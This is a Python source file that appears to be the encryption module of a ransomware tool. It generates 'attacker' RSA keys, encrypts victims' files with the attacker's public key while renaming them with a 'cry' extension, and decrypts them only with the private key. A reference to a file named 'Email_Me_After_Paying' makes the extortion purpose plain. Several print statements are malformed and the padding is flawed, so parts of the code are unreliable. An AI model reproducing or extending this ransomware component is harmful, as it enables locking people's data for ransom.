import base64
import os
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend as crypto_default_backend
from cryptography.hazmat.primitives import serialization as crypto_serialization
from cryptography.hazmat.primitives.asymmetric import padding as crypto_padding
from cryptography.hazmat.primitives import hashes as crypto_hashes


def is_non_zero_file(fpath):
    return os.path.isfile(fpath) and os.path.getsize(fpath) > 0


# Generates RSA Encryption + Decryption keys / Public + Private keys
def genattackerkeys():
    dest_path = "./keysafe"
    try:
        os.makedirs(dest_path, 0o777, exist_ok=True)
    except OSError as err:
        dest_path = os.getcwd()
        print("Creation of destination failed. Current directory is :" % dest_path)
    except FileExistsError:
        print("Attacker files exist. Quitting without creating new keys.")
        print("Delete following folder and try again: " % dest_path)
    else:
        privkeypathstring = dest_path + '/private.pem'
        pubkeypathstring = dest_path + '/public.pem'
        private_key = rsa.generate_private_key(
            backend=crypto_default_backend(),
            public_exponent=65537,
            key_size=2048
        )
        public_key = private_key.public_key()
        public_key_pem = public_key.public_bytes(
            crypto_serialization.Encoding.PEM,
            crypto_serialization.PublicFormat.SubjectPublicKeyInfo
        )
        private_key_pem = private_key.private_bytes(
            crypto_serialization.Encoding.PEM,
            crypto_serialization.PrivateFormat.PKCS8,
            crypto_serialization.NoEncryption())
        with open(privkeypathstring, 'wb') as f:
            f.write(private_key_pem)
        with open(pubkeypathstring, 'wb') as f:
            f.write(public_key_pem)


def encrypt_file(filepath, public_key_path):
    f = open(filepath, 'rb')
    fileblob = f.read()
    f.close()
    if not (filepath.endswith("cry")):
        enc_blob = encrypt_blob(fileblob, public_key_path)
        filepath = filepath + "cry"
        with open(filepath, 'wb') as outf:
            outf.write(enc_blob)
    return filepath


def encrypt_blob(fileblob, public_key_path):
    with open(public_key_path, "rb") as key_file:
        attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
                                                                       backend=crypto_default_backend())
    chunk_size = 190
    offset = 0
    end_loop = False
    encrypted = b""
    while not end_loop:
        chunk = fileblob[offset: offset + chunk_size]
        if len(chunk) % chunk_size != 0:
            end_loop = True
            chunk += b" " * (chunk_size - len(chunk))
        enc_chunk = attacker_public_key.encrypt(chunk, crypto_padding.OAEP(
            mgf=crypto_padding.MGF1(
                algorithm=crypto_hashes.SHA256()),
            algorithm=crypto_hashes.SHA256(),
            label=None
        ))
        encrypted += enc_chunk
        offset += chunk_size
    encrypted_blob = base64.b64encode(encrypted)
    return encrypted_blob


def decrypt_file(filepath, private_key_path):
    f = open(filepath, 'rb')
    fileblob = f.read()
    f.close()
    if filepath.endswith("cry"):
        dec_blob = decrypt_blob(fileblob, private_key_path)
        filepath = filepath[:-3]
        with open(filepath, 'wb') as outf:
            outf.write(dec_blob)
    return filepath


def decrypt_blob(encryptedblob, private_key_path):
    encryptedblob = base64.b64decode(encryptedblob)
    chunk_size = 256
    offset = 0
    decrypted = b""
    with open(private_key_path, "rb") as key_file:
        attacker_private_key = crypto_serialization.load_pem_private_key(key_file.read(), password=None,
                                                                         backend=crypto_default_backend())
    while offset < len(encryptedblob):
        chunk = encryptedblob[offset: offset + chunk_size]
        decrypted += attacker_private_key.decrypt(chunk, crypto_padding.OAEP(
            mgf=crypto_padding.MGF1(
                algorithm=crypto_hashes.SHA256()),
            algorithm=crypto_hashes.SHA256(),
            label=None
        ))
        offset += chunk_size
    print(decrypted)
    return decrypted


if __name__ == '__main__':
    # genattackerkeys()
    # print(encrypt_file("./f1.txt", "../keysafe/public.pem"))
    print(decrypt_file("./Email_Me_After_Paying.pemcry", "../keysafe/private.pem"))
